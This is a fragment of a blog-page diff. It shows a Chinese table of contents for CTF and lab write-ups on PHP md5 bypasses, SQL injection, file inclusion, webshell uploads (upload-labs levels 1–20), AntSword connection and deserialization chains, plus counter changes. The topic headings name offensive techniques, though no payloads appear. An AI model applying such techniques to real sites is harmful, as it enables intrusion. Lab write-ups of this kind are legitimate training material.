nav-level-4"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="nav-number">9.1.2.1.</span> <span class="nav-text">语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="nav-number">9.1.2.2.</span> <span class="nav-text">返回值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ffifdyop%E7%BB%95%E8%BF%87"><span class="nav-number">9.1.2.3.</span> <span class="nav-text">ffifdyop绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A80e%E7%BB%95%E8%BF%87"><span class="nav-number">9.1.2.4.</span> <span class="nav-text">使用0e绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="nav-number">9.1.2.5.</span> <span class="nav-text">使用数组绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#error-reporting"><span class="nav-number">9.1.3.</span> <span class="nav-text">error_reporting()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">9.1.4.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#select%E8%AF%AD%E5%8F%A5"><span class="nav-number">9.1.4.1.</span> <span class="nav-text">select语句</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-4"><span class="nav-number">9.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-md5"><span class="nav-number">10.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]easy_md5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyrce"><span class="nav-number">11.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]easyrce</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#eval"><span class="nav-number">11.1.</span> <span class="nav-text">eval</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LitCTF-2023-PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80%EF%BC%81%EF%BC%81"><span class="nav-number">12.</span> <span class="nav-text">[LitCTF 2023]PHP是世界上最好的语言！！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSSCTF-2022-Spring-Recruit-babyphp"><span class="nav-number">13.</span> <span class="nav-text">[NSSCTF 2022 Spring Recruit]babyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-include"><span class="nav-number">14.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="nav-number">15.</span> <span class="nav-text">[极客大挑战 2019]Secret File</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86-5"><span class="nav-number">15.1.</span> <span class="nav-text">涉及知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">15.1.1.</span> <span class="nav-text">PHP伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1exit"><span class="nav-number">15.1.2.</span> <span class="nav-text">利用filter伪协议绕过死亡exit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strstr%E5%87%BD%E6%95%B0"><span class="nav-number">15.1.3.</span> <span class="nav-text">strstr函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95-1"><span class="nav-number">15.1.3.1.</span> <span class="nav-text">语法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#href%EF%BC%9A%E6%84%8F%E6%80%9D%E6%98%AF%E6%8C%87%E5%AE%9A%E8%B6%85%E9%93%BE%E6%8E%A5%E7%9B%AE%E6%A0%87%E7%9A%84URL%EF%BC%8Cemmmm-%E5%90%8E%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%98%AF%E4%BB%BB%E4%BD%95%E6%9C%89%E6%95%88%E6%96%87%E6%A1%A3%E7%9A%84%E7%9B%B8%E5%AF%B9%E6%88%96%E7%BB%9D%E5%AF%B9URL"><span class="nav-number">15.1.4.</span> <span class="nav-text">href：意思是指定超链接目标的URL，emmmm,后面可以是任何有效文档的相对或绝对URL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-5"><span class="nav-number">15.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">16.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#boogipop%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">17.</span> <span class="nav-text">boogipop文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1"><span class="nav-number">17.1.</span> <span class="nav-text">1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">17.1.1.</span> <span class="nav-text">使用伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">17.1.2.</span> <span class="nav-text">使用一句话木马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2"><span class="nav-number">17.2.</span> <span class="nav-text">2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86-6"><span class="nav-number">17.2.1.</span> <span class="nav-text">涉及知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">17.2.2.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">17.2.3.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3"><span class="nav-number">17.3.</span> <span class="nav-text">3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A"><span class="nav-number">17.3.1.</span> <span class="nav-text">涉及</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4"><span class="nav-number">17.4.</span> <span class="nav-text">4</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">18.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-01"><span class="nav-number">18.1.</span> <span class="nav-text">pass-01</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-1"><span class="nav-number">18.1.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-1"><span class="nav-number">18.1.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">18.1.3.</span> <span class="nav-text">蚁剑连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-02"><span class="nav-number">18.2.</span> <span class="nav-text">pass-02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-03"><span class="nav-number">18.3.</span> <span class="nav-text">pass-03</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-04"><span class="nav-number">18.4.</span> <span class="nav-text">pass-04</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-05"><span class="nav-number">18.5.</span> <span class="nav-text">pass-05</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-06"><span class="nav-number">18.6.</span> <span class="nav-text">pass-06</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-07-%EF%BC%88%E7%A9%BA%E6%A0%BC%EF%BC%89pass-08%EF%BC%88%E7%82%B9%E5%8F%B7%EF%BC%89"><span class="nav-number">18.7.</span> <span class="nav-text">pass-07 （空格）pass-08（点号）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-09"><span class="nav-number">18.8.</span> <span class="nav-text">pass-09</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-10"><span class="nav-number">18.9.</span> <span class="nav-text">pass-10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-11"><span class="nav-number">18.10.</span> <span class="nav-text">pass-11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-12"><span class="nav-number">18.11.</span> <span class="nav-text">pass-12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-13"><span class="nav-number">18.12.</span> <span class="nav-text">pass-13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-14"><span class="nav-number">18.13.</span> <span class="nav-text">pass-14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-15"><span class="nav-number">18.14.</span> <span class="nav-text">pass-15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-16"><span class="nav-number">18.15.</span> <span class="nav-text">pass-16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-17"><span class="nav-number">18.16.</span> <span class="nav-text">pass-17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-18"><span class="nav-number">18.17.</span> <span class="nav-text">pass-18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-19"><span class="nav-number">18.18.</span> <span class="nav-text">pass-19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-20"><span class="nav-number">18.19.</span> <span class="nav-text">pass-20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">18.20.</span> <span class="nav-text">序列化和反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1"><span class="nav-number">18.21.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1"><span class="nav-number">18.22.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3pop%E9%93%BE"><span class="nav-number">18.23.</span> <span class="nav-text">3pop链</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BUU-SQL-COURSE-1"><span class="nav-number">19.</span> <span class="nav-text">BUU SQL COURSE 1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E7%9F%A5%E8%AF%86-7"><span class="nav-number">19.1.</span> <span class="nav-text">涉及知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-6"><span class="nav-number">19.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="nav-number">20.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -1655,7 +1115,7 @@ em,烦人的or,双写得到password,然后flag就出来了
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1668,7 +1128,7 @@ em,烦人的or,双写得到password,然后flag就出来了
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
